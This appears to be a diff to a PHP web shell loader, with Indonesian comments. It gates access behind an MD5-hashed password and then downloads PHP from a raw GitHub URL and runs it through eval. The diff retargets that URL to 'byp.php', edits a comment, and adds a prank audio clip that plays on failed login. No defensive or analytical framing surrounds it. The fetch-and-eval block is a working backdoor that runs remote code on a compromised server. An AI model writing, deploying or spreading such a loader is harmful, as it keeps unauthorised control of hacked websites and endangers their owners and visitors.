@@ -6,7 +6,7 @@ return isset($_SESSION['X-H0UR']);
 }
 // Fungsi untuk memvalidasi login
 function login($password) {
-$valid_password_hash = 'e6d037be0f9413ca1751cce755f342ab'; // MD5 hash password
+$valid_password_hash = 'e6d037be0f9413ca1751cce755f342ab'; // tbl hash password
 $password_hash = md5($password);
 if ($password_hash === $valid_password_hash) {
 $_SESSION['X-H0UR'] = 'user';
@@ -44,6 +44,7 @@ if (login($password)) {
 header('Location: ' . $_SERVER['PHP_SELF']);
 exit;
 } else {
+echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
 $error_message = "Password salah!";
 echo '<script>alert("' . $error_message . '");</script>';
 }
@@ -71,7 +72,7 @@ echo "GAGAL $de";
 }
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/byp';
+$url = 'https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/byp.php';
 $content = getRawContent($url);
 eval('?>' . $content);
 exit;
